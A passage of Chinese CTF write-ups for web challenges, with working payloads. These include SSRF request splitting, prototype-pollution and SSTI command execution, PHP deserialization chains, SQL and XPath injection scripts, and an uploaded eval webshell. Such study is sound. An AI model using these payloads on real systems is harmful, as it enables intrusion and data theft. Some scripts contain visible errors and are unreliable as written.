  return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\n\n```\nupload路由判断ip是否为127.0.0.1  \n根据mimetype拼接路径，可控  \n可以通过`/uploads/../template/`上传文件到/template/  \npug文件包含flag文件[pug-包含include](https://pugjs.org/zh-cn/language/includes.html))  \n>对于直接使用的 Web 应用，必须使用从TCP连接中得到的 Remote Address，才是用户真实的IP\n\n用了remoteaddress ,ip不能伪造，考虑ssrf  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)\n\ncore路由:\n```js\napp.get('/core', function(req, res) {\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q\n        //访问本地,q可控\n        console.log(url)\n        var trigger = blacklist(url);\n        if (trigger === true) {\n            res.send(\"\");\n               } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\n```\n利用q来访问只允许本地访问的file_upload路由  \n\n在file_upload里上传.pug文件，修改content-type，利用action渲染pug文件  \n[通过拆分攻击实现的SSRF攻击](https://xz.aliyun.com/t/2894)\n>程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符。\n\n\n[Nullcon HackIM 2020 - split second](https://blog.rwx.kr/nullcon-hackim-2020-split-second/)\n\n>node.js命令执行payload`global.process.mainModule.require('child_process').exec('ls')`  \n\n抓个.pug上传的包来构造数据  \n\nexp from [guoke](https://guokeya.github.io/post/hz6_KR03h/)\n```py\nimport urllib.parse\nimport requests\n\npayload = ''' HTTP/1.1\n\nPOST /file_upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------919695033422425209299810\nContent-Length: 291\n\n----------------------------919695033422425209299810\nContent-Disposition: form-data; name=\"file\"; filename=\"abc.pug\"\nContent-Type: ../template\n\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../flag.txt\n\n----------------------------919695033422425209299810--\n\nGET /flag HTTP/1.1\nx:'''\npayload = payload.replace(\"\\n\", \"\\r\\n\")\npayload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)\nr = requests.get('http://http://11677f6e-fb23-401a-b5da-eb66185d1871.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))\n#url编码\nprint(r.text)\n```\n>最后的GET /flag只是为了闭合HTTP请求\n\n访问/?action=abc\n\n[出题人wp](https://blog.5am3.com/2020/02/11/ctf-node1/#nullcon-HackIM-2020-split-second)\n出题人给的exp是通过命令执行的方式来实现的，在pug里可以通过 `#{payload}` `- payload`  来执行pug文件里的命令\n\n# [GYCTF2020]Ez_Express\n注册完之后看源码有注释可以下载www.zip![](https://md.vidar.club/uploads/upload_0e3cd44933fa2cfff69f15365340127c.png)\n原型链污染 rce\nclone()在/action里\n[Node.js 原型污染攻击的分析与利用](https://xz.aliyun.com/t/4229#toc-6)\n[JavaScript原型链污染初探](https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#%E5%8E%9F%E5%9E%8B)\nclone()在/action里\n\n>该项目使用了ejs作为模板引擎，该模板引擎中通常由eval等操作用于解析\n>express框架，支持Json直接传输数据，并且接收的参数为req.body\n>toUpperCase():字符\"ı\"、\"ſ\" 经过toUpperCase处理后结果为 \"I\"、\"S\"\n\n源码注册限制了`ADMIN`\n让用户名为`ADMıN`就可以绕过限制注册一个admin账户  \n\n提示了这个\n`Hello,ADMIN ,flag in /flag`\n接下来应该就是rce  \n先找一下利用点  \n```js\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n```\n发现源码里的outputFunctionName为undefined，那应该就是这了  \ncontent-type需要改为json  \n\npayload:\n```\n{\"lua\":\"aaa\",\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.require('child_process').execSync('cat /flag'); //\"}}\n```\n# [SWPUCTF 2018]SimplePHP\n打开是一个文件上传的界面  \n源码中有提示\n```\n<!--flag is in f1ag.php-->\n```\n所以是要想办法读取f1ag.php的内容  \n先找找源码  \n上传文件成功之后在查看文件里找不到传过的文件，看看url发现\n`/file.php?file=`\n感觉是让我们往后面加东西，试着加了index.php回显了源码  \nclass.php:\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\npchar反序列化  \n[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)\n\npop链是C14r中的echo触发__toString,触发__get()  \n只做了后缀名的检测  \n修改后缀名绕过$allowed_types  \n>phar文件的扩展名是独立的，如果evil.phpr被重命名为了evil.jpg，上面的触发phar反序列化的示例仍然有效  \n\n\n上传到服务器后利用file_exitsts使用phar://执行代码  \n利用点是\n```php\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n```\nphar.phar:\n```php\n<?php\nclass C1e4r\n{\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n}\n\nclass Show\n{\n    public $str;\n    public function __construct($file)\n    {\n        $this->str=array(); #创建数组，后面需要利用str['str']\n    }\n}\n\nclass Test\n{\n    public $params;\n    public function __construct()\n    {\n        $this->params = array(); #需要利用params['source']=flag文件路径\n    \n}\n\n$b=new Test();\n$b->params=array('source'=>/var/www/html/f1ag.php);\n$a=new Show();\n$a->str=array('str'=>$b);#触发test的__get()\n$c=new C1e4r($a);\n\n\n$phar = new Phar('phar.phar');\n$phar -> stopBuffering();\n$phar -> setStub('<?php __HALT_COMPILER();?>');\n$phar -> addFromString('test.txt','test');\n$phar -> setMetadata($object);\n$phar -> stopBuffering();\n```  \n上传,截包改后缀名    \n根据`$filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"`\n得到上传的地址  \n\n访问`file.php?file=phar://upload/66a453d5efb51fb0aaafc7840b7e5915.jpg`\n~~怎么又file dosen't exist了啊./upload/目录下明明就有啊，拿了别人的poc试也是不行....~~\n\n# [网鼎杯 2020 朱雀组]phpweb\n\nfunc参数输入测试回显出了这里用的函数是call_user_func()\n给了index.php的路径，读一下\n```php\nfunc=readfile&p=/var/www/html/index.php\n```\n回显如下\n```php\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n看到类联想到反序列化(这里卡了蛮久的...不太应该...)  \n可以利用unserialize函数  \npayload:\n```php\n<?php\n\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n    }\n\n$a=new Test();\n$a->p=\"ls /tmp/flagoefiu4r93\";\n$a->func=\"system\";\necho serialize($a);\n    ?>\n```\n路径是猜的，=。=，感觉要么放在sys，要么放在tmp，要么放在其他的什么地方就试了下\nlinux命令可以用`find / -name *flag*`\n\n# [Black Watch 入群题]Web \n![](04.png)\n热点跳转截包得\n```\nGET /backend/content_detail.php?id=1 HTTP/1.1\n```\n可能在id处存在注入  \n[SQL注入ByPass的一些小技巧](https://www.secpulse.com/archives/68991.html)  \n测试:\n```\n1^1^0，1^0^0\n```\n当id=0时返回[]，而id为1时返回数据  \n利用这个特性进行异或注入  \n\n利用`id=1^(length('show')=4)`检测是否过滤某些字符\n过滤`union`  `/**/` `--+` 空格 `;` `and` `\"` `{}` `limit`\n\n \n>使用注释绕过，/\\*\\*/\n>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格\n>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a\n\n>ord()：ord() 函数是chr() 函数（对于8 位的ASCII 字符串）的配对函数，它以一个字符串（Unicode 字符）作为参数，返回对应的ASCII 数值，或者Unicode 数值  \n>string substr(string, start, length)\n> LIMIT 0,1,从0开始取1条\n\n\n我的表名爆破好像有点问题，不论输什么都回显`[]`\n但是同样的payload爆列名却没什么问题...\n```python\nimport requests\nimport time\nimport urllib \n\nurll= 'http://a1b1ea65-d14e-445c-a719-c623ba26a122.node3.buuoj.cn/backend/content_detail.php?id='\nmark='[]'\n\n'''\ndef table_name():\n   #list = []\n   # for k in range(0,4):#表个数\n    name=''\n    for j in range(1,20):\n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':          \n            url = urll+\"1^if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))='%s',1,0)\" %(j,i)                               \n            r = requests.get(url)\n            if mark in r.text:\n                name = name+i\n                print(name)\n                break\n    #list.append(name)\n    print('table_name:',name)\ntable_name()\n'''\n'''\ndef column_name():\n    #list = []\n    #for k in range(0,3): #判断表里最多有4个字段\n    name=''\n    for j in range(1,40): #判断一个 字段名最多有9个字符组成\n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':\n            url=urll+\"1^if(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),%d,1)='%s',1,0)\" %(j,i)\n            r=requests.get(url)\n            if mark in r.text:\n                name=name+i\n                break\n    #list.append(name)\n    print ('column_name:',name)\ncolumn_name()\n'''\n\ndef res_name():\n    name = ''\n    for j in range(1,20): \n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':\n            url = urll+\"1^if(substr((select(group_concat(username))from(admin)),%d,1)='%s',1,0)\" %(j,i)\n            # password from admin\n            r = requests.get(url)\n            if mark in r.text:\n                name = name+i\n                \n                print(name)\n                \n                break\n    print('res_name:',name)\nres_name()\n```\n[Black-Watch-入群题-Web](http://www.ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web)\n贴个别人的exp  \n那我这个if语句是不是有点多余...\n他是利用ascii的大小比较直接出的结果\n\n# [GKCTF2020]CheckIN\n直接传个一句话木马上去,蚁剑b64编码器连一下\n\n执行readflag就可以读到flag\n[php7-gc-bypass](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)\n蚁剑脚本传到/tmp下  \n\n`include('/tmp/exp.php');`\n\n在脚本中改为\n```\npwn(\"echo `/readflag`\");\n```\n\n# [GKCTF2020]EZ三剑客-EzNode\n这个和NPUCTF的验证🐎一样的\n源码:\n```js\napp.use((req, res, next) => {\n  if (req.path === '/eval') {\n    let delay = 60 * 1000;\n    console.log(delay);\n    if (Number.isInteger(parseInt(req.query.delay))) {\n      delay = Math.max(delay, parseInt(req.query.delay));\n    }\n    const t = setTimeout(() => next(), delay);\n    //delay秒后执行next()\n    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事\n    setTimeout(() => {\n      clearTimeout(t);\n      console.log('timeout');\n      try {\n        res.send('Timeout!');\n      } catch (e) {\n\n      }\n    }, 1000);\n    //1s后执行timeout\n  } else {\n    next();\n  }\n});\n\napp.post('/eval', function (req, res) {\n  let response = '';\n  if (req.body.e) {\n    try {\n      response = saferEval(req.body.e);\n    } catch (e) {\n      response = 'Wrong Wrong Wrong!!!!';\n    }\n  }\n  res.send(String(response));\n});\n```\n这里next()的意思是执行下一个路由\n\n我的理解是如果说delay>1s，那么后面的setTimeout()函数就会执行，也就会出现回显\"Timeout！\"  \n我们需要让t的setTimeout()更快执行完毕  \n从setTimeout()入手\n[setTimeout](http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args)\n>当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1行\n\n[saferEval_issue](https://github.com/commenthol/safer-eval/issues/10)\n![](05.png)\n\n# [RCTF2015]EasySQL\n注册一个用户，发现可以修改密码，猜测是二次注入  \n注册`1\"`，changepwd.php回显`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"1\"\" and pwd='c4ca4238a0b923820dcc509a6f75849b'' at line 1`  \n报错注入  \n注册处username注入反映在密码修改界面  \nusername，email过滤\n```\n空格 @ order limit mid substr and right left\n```\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#\nXPATH syntax error: '~article,flag,users~'\n```\n\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#\nXPATH syntax error: '~flag~'\n```\n\n```\n1\"||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#\nXPATH syntax error: '~RCTF{Good job! But flag not her'\n```\nupdatexml()输出有长度限制，32位  \n\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')regexp('^r')),0x7e),1)#\nXPATH syntax error: '~name,pwd,email,real_flag_1s_her'\n```\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#\nXPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'\n```\n有用的数据应该在`xxx`之后\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!='xxx')),0x7e),1)#\nXPATH syntax error: '~flag{d507ee9e-9482-426f-8f0d-1c'\n```\n截取字符串的函数貌似都差不多过滤了  \n啊还可以逆序输出啊....  \n```\n1\"||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!='xxx'))),0x7e),1)#\n}5de64062c7c1-d0f8-f624-2849-e9\n```\n\n[regexp盲注](https://xz.aliyun.com/t/5356)\n>正常的语句为：select username from users where id = 1\n正常返回：admin\n构造语句：\nselect (select username from users where id = 1) regexp '^a' 返回真(1)\nselect (select username from users where id = 1) regexp '^b' 返回假(0)\n因为这里'^a'是匹配以a开头的字符串，原来正常返回的就是admin，所以会返回真。\n继续就可以使用 regexp '^ad'...读出想要的数据\n\n可以通过正则匹配来输出指定数据  \n以此来输出f开头的内容\n```\n1\"||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')regexp('^r'))),1))#\n```\n# [GYCTF2020]FlaskApp\n熟悉下  \n解密界面输入b64的{{config}}会有回显  \n\n`'DEBUG':True`  \n解密界面只要提交无法b64decode的value就可以回显报错界面，可以借此得到一些源码信息    \n```\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        ​res =  render_template_string(tmp)\n```\n有个waf,应该过滤了些东西  \n\n之前写iscc的时候找到的exp模板改一改(X\n大概过滤了`eval import popen os ls`（猜的\n\n```\n{% for c in [].__class__.__base__.__subclasses__() %} #找到能用的function\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['ev'+'al']('__imp'+'ort__'+'(\"o'+'s\")'+'.po'+'pen'+'(\"l'+'s\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\n回显\n```\n app.py static templates\n```\n\n读app.py\n\n```py\ndef waf(str): black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"] \n  for x in black_list : \n    if x in str.lower() : \n        return 1 \n```\n然后，`ls /`\n```\napp bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var\n```\n```\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['ev'+'al']('__imp'+'ort__'+'(\"o'+'s\")'+'.po'+'pen'+'(\"c'+'at /this_is_the_fl'+'ag.txt\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\n>__class__:获得当前对象的类\n__bases__:列出其基类\n__mro__ :列出解析方法的调用顺序，类似于bases\n__subclasses__()：返回子类列表\n__dict__ ： 列出当前属性/函数的字典\nfunc_globals返回一个包含函数全局变量的字典引用\n\n# [GKCTF2020]cve版签到\nnetwork：  \nhint:flag in localhost  \ntips:Host must be end with '123'  \n\n让url=127.0.0.1  \n但是题目说`you can just view *.ctfhub.com`   \n结合题目在php/7.3.15版本下寻找能绕过.ctfhub.com的cve  \n[CVE-2020-7066](http://vulhub.org.cn/vuln/VH-CVE-2020-7066)  \n>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\\ 0）字符，则URL将被静默地截断\n  \n`payload:?url=http://127.0.0.123%00.ctfhub.com`\n\n\n\n","tags":["practice"]},{"title":"Ha1cyon_CTF","url":"/2020/04/19/Ha1cyon-CTF/","content":"\n# web\n## 查源码\n如题  \n\n## RealEzPHP\n源码\n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\n反序列化  \n$b($a)=>$b是个函数名    \nflag在phpinfo里  \n不过s:0:\"\";是不行的  \n![](01.png)\n```\nO:8:\"HelloPhp\":2:{s:1:\"a\";s:2:\"-1\";s:1:\"b\";s:7:\"phpinfo\";}\n```\n\n## ezlogin\n### 前导知识\n抓包信息发现xml请求=>1.xxe 2.xpath盲注  \n[XPath注入指北](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)  \n[xpath注入详解](https://www.cnblogs.com/backlion/p/8554749.html)\n![](03.png)\n查询语句:  \n$query = \"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\";  \n\n1.万能密码:\n```\n$name => admin' or '1\n$pwd => \n```\n2.盲注\n\n判断根节点数量：\n```\n$name=>' or count(/)=1 or '1\n```\ncount(/)=n若返回正常，则代表有n个根节点  \n\n获取名字长度:\n```\n$name=>' or string-length(name(/*[1]))=n or '1\n```\n若返回正常，则第一个根节点名长度为n\n\n获取内容:\n```\n$name=>'or substring(name(/*[1]),1,1)='a' or '1\n```\n逐个字符遍历第一个根节点名字的第一个字符 range('a','z')  \n当返回正常时可确定其字符\n\n### 题目\n用户名输入 'or count(/)=n or '1测试是否能注入,n从1开始取 \n取1时显示非法操作，取2显示用户名或密码错误，存在注入   \n脚本来自[NPUCTF ezlogin](http://phoebe233.cn/index.php/archives/35/)\n>re.findall(pattern, string, flags=0)  \n返回string中所有与pattern相匹配的全部字串，返回形式为数组\n\n>登录界面需要保存session，否则会返回\"请登录\"信息，无法登录\n\n```python\nimport requests\nimport re\nsess = requests.session()\nstrs='abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'\nheaders = {'Content-Type':'application/xml'}\nparam='<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />'\n#token会过期变化，所以用正则匹配任意token\nt=''\nfor i in range(1,50):\n    for s in strs:\n        url='http://ha1cyon-ctf.fun:30015/login.php'\n        token=re.findall(param,sess.get(url).text)[0]\n\n        #str(i)代表第n个pos，pwd随意取值\n        #第一个根节点为root\n        #data=\"<username>' or substring(name(/*[1]), '\"+str(i)+\"', 1)='\"+str(s)+\"' or '1</username><password>123</password><token>\"+token+\"</token>\"\n\n        #第二个节点为accounts\n        #data = \"<username>' or substring(name(/root/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #第三个节点为user\n        #data = \"<username>' or substring(name(/root/accounts/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #遍历[1][2][3],在user节点下得到id，username，password\n        #name(/root/accounts/user/*[1])\n        #name(/root/accounts/user/*[2])\n        #name(/root/accounts/user/*[3])\n        #data = \"<username>' or substring(name(/root/accounts/user/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #之后取user下的子节点username（user[1]），得到 gtfly123\n        #取第二个子节点user[2]结果是adm1n\n        #data = \"<username>' or substring(/root/accounts/user[1]/username/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #求adm1n的密码\n        #data = \"<username>' or substring(/root/accounts/user[2]/password/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n        res=sess.post(url=url,headers=headers,data=data)\n        if '非法操作' in res.text:\n            t+=s\n            print(t)\n            break\n```\n格式为\n```xml\n<root>\n    <accounts>\n        <user>\n            <id></id>\n            <username>gtfly123</username>\n            <password>xxxxxxxxxx</password>\n        </user>\n        <user>\n            <id></id>\n            <username>adm1n</username>\n            <password>xxxxxxxxx</password>\n        </user>\n    </accounts>\n</root>\n```\nmd5解密后登录后台，文件包含可用大小写绕过\n```\n/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag\n```\n\n## ezinclude\nhash拓展攻击,借助hashpump工具[HashPump](https://github.com/bwall/HashPump)  \nexample:\n```\ninput:hashpump -s '6d5f807e23db210bc254a28be2d6759a0f5f5d99' --data 'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo' -a '&waffle=liege' -k 14\n\noutput:\n0e41270260895979317fff3898ab85668953aaa2\ncount=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&waffle=liege\n```\n\n~~这题好像当时给了两个hint说是喜欢放假flag?~~\n![](04.png)\n可以联想到hash拓展攻击  \n在cookie里可以获取到hash值  \n但是没有提供密钥长度所以需要脚本爆破  \n```python\nimport os\nimport requests\nfor i in range(1,12):\n    data=os.popen('hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k '+str(i)+' -a admin').read()\n    name=data.split('\\n')[0]\n    password=data.split('\\n')[1].replace('\\\\x','%') #urlencode\n    result=requests.get('http://192.168.0.166/index.php?name='+password+'&pass='+name).text\n    print(result)\n```\n👆官方写的脚本，不过复现的时候失败了  \n![](05.png)\n官方应该是想借助原本不传值时的hash值来求出$name的值  \n不过直接传name的值然后得到对应的$pass也可以0.0  \n~~又感觉到思维的限制了~~\n得到flflflflag.php  \n进入后有\n```html\n<html>\n\n<head>\n    <script language=\"javascript\" type=\"text/javascript\">\n        window.location.href=\"404.html\";\n    </script>\n    <title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>\n</head>\n<>\n\n    <body>\n        include($_GET[\"file\"])</body>\n\n</html>\n```\n在请求头里可以看见php的版本是7.0.33  \n[文件包含的一些getshell姿势](https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/)  \n[LFI via SegmentFault-王一航](https://www.jianshu.com/p/dfd049924258)\n[自包含,php7segment fault相关](https://www.aqniukt.com/article/257)\n>这里要说的是在含有文件包含漏洞的地方，使用php://filter/string.strip_tags导致php7 segment fault，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录(<php7.2)，再进行文件名爆破就可以getshell\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复  \n\n• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复  \n\n• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复  \n```python\nimport requests\nimport re\nfile_data={\n    'file': \"<?php eval($_POST[1]);\"\n}\nurl=\"http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\ntry:\n    r=requests.post(url=url,files=file_data,allow_redirects=False)\nexcept:\n        print(1)\n```\n官方说的是访问http://192.168.0.128:8105/dir.php\n就可以得到临时文件名  \n~~但是不能用扫描器也没有hint,dir.php哪来的~~\nhttp://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=/tmp/phpFqq1b1&1=phpinfo();\nflag在phpinfo();里  \n所以👆直接访问就好\n\n## 验证🐎\n源码\n```js\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieSession = require('cookie-session');\n\nconst fs = require('fs');\nconst crypto = require('crypto');\n\nconst keys = require('./key.js').keys;\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个\n\nconst template = fs.readFileSync('./index.html').toString();\nfunction render(results) {\n  return template.replace('{{results}}', results.join('<br/>'));\n}\n\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(bodyParser.json());\n\napp.use(cookieSession({\n  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧\n  keys\n}));\n\nObject.freeze(Object);\nObject.freeze(Math);\n\napp.post('/', function (req, res) {\n  let result = '';\n  const results = req.session.results || [];\n  const { e, first, second } = req.body;\n  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {\n    if (req.body.e) {\n      try {\n        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\n      } catch (e) {\n        console.log(e);\n        result = 'Wrong Wrong Wrong!!!';\n      }\n      results.unshift(`${req.body.e}=${result}`);\n    }\n  } else {\n    results.unshift('Not verified!');\n  }\n  if (results.length > 13) {\n    results.pop();\n  }\n  req.session.results = results;\n  